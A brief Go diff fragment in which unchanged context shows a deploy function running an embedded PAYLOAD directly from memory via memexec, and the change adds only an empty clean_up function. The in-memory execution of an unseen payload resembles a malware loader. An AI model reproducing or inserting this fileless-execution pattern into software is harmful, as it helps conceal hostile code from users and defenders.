@@ -49,3 +49,7 @@ func deploy(path string) {
 	exe, _ := memexec.New([]byte(PAYLOAD))
 	exe.Command().Run()
 }
+
+func clean_up() {
+	
+}
